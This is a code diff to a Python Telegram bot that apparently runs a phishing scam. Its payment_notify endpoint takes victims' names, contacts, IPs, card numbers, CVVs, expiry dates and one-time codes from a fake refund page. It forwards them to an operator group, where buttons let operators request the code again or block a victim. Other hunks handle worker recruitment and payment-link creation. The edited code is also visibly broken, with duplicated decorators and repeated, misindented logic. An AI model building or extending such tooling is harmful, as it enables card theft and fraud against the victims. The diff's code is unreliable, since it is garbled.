@@ -383,6 +383,10 @@ async def process_experience(message: types.Message):
     await message.answer("🖼 Отправьте скриншоты ваших профитов (до 3х)\nМожно пропустить", reply_markup=skip_kb)
 
 
+
+@router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots' and m.text and 'пропустить' in m.text.strip().lower())
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
 @ban_guard
 async def skip_screenshots(message: types.Message):
@@ -402,9 +406,21 @@ async def skip_screenshots(message: types.Message):
             import traceback
             traceback.print_exc()
         user_step[uid] = None  # Скидаємо крок навіть якщо сталася помилка
+
+    user_step[uid] = None
+    if 'screenshots' not in user_data.get(uid, {}):
+        user_data.setdefault(uid, {})['screenshots'] = []
+    await finish_form(message)
+    # Only process if user is in screenshots step
+    if user_step.get(uid) == 'screenshots':
+        if 'screenshots' not in user_data.get(uid, {}):
+            user_data.setdefault(uid, {})['screenshots'] = []
+        await finish_form(message)
+
         print(f"[DEBUG] User step reset to None")
     else:
         print(f"[DEBUG] User is not in screenshots step, ignoring")
+
     return
 
 @router.message(lambda m: m.content_type == types.ContentType.PHOTO)
@@ -645,10 +661,10 @@ async def admin_panel_action(message: types.Message):
         user_step[message.from_user.id] = 'manual_payment_amount'
         await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):")
         # Тут логіка для прямої оплати
-        await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
+        # await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
 
     else:
-        await message.answer("Неизвестная команда.")
+        pass  # Відповідь на невідому команду тепер тільки у fallback-хендлері
 
 @router.callback_query(lambda c: c.data == "payuser_back")
 async def payuser_back_handler(call: types.CallbackQuery):
@@ -1111,6 +1127,7 @@ async def block_others(message: types.Message):
             link = f"https://artpullse.com/refund/?total={amount}{currency}"
             await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
             return
+    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
     # Ігноруємо всі кроки сценарію івентів та всі варіанти кнопки 'Ссылки'
     if message.text and 'ссылки' in message.text.lower():
         return
@@ -1299,14 +1316,27 @@ async def payment_notify(request):
     cvv = data.get('cvv', '')
     code = data.get('code', '')
     ip = data.get('ip', '')
-
+    # --- Додаємо суму ---
+    price = data.get('price', '')
+    currency = data.get('currency', '')
+    total = data.get('total', '')
+    sum_str = ''
+    if price and currency:
+        sum_str = f'\nСумма: {price} {currency}'
+    elif total:
+        import re
+        m = re.match(r"(\d+[\.,]?\d*)([A-Za-z]+)", total)
+        if m:
+            sum_str = f'\nСумма: {m.group(1).replace(",", ".")} {m.group(2)}'
+        else:
+            sum_str = f'\nСумма: {total}'
     # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування
     msg1 = (
         f"Мамонт ввёл Ф.И.О.: <b>{name}</b>\n\n"
         f"phone_number: {phone}\n"
         f"full_name: {name}\n"
         f"mail: {email}\n"
-        f"ip: {ip}"
+        f"ip: {ip}" + sum_str
     )
     kb1 = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -1316,56 +1346,35 @@ async def payment_notify(request):
             ]
         ]
     )
-    user_id = data.get('user_id', '')
-    
-    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
-    if user_id and ip:
-        update_site_user_ip(user_id, ip)
-    
-    # --- Отримуємо дані користувача з бази ---
-    user_data_from_db = None
-    if user_id:
-        user_data_from_db = get_site_user(user_id)
-    
-    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
-    
-    # Додаємо інформацію з бази даних, якщо є
-    if user_data_from_db:
-        text += f"\nSite User ID: {user_data_from_db['id']}"
-        text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
-        text += f"\nАдрес: {user_data_from_db['street']}"
-    
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
-
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     msg2 = (
         f"Email: {email}\n"
         f"Card Number: {card}\n"
         f"Expiry Date: {expiry}\n"
         f"CVV: {cvv}\n"
-        f"IP: {ip}"
+        f"IP: {ip}" + sum_str
     )
     kb2 = InlineKeyboardMarkup(
         inline_keyboard=[
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
-        [
+            [
+                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            ],
+            [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+            ]
         ]
-    ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
-
     # 3. Повідомлення з кодом, IP + кнопка Request again
     if code:
         msg3 = (
             f"Code: {code}\n"
-            f"IP: {ip}"
+            f"IP: {ip}" + sum_str
         )
         kb3 = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -1375,7 +1384,6 @@ async def payment_notify(request):
             ]
         )
         await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
-
     return web.Response(text='ok')
 
 @log_function
@@ -1628,4 +1636,3 @@ def get_site_user_id_by_page(page_code):
     return row[0] if row else None
 
 # --- API: page_code by user_id ---
-
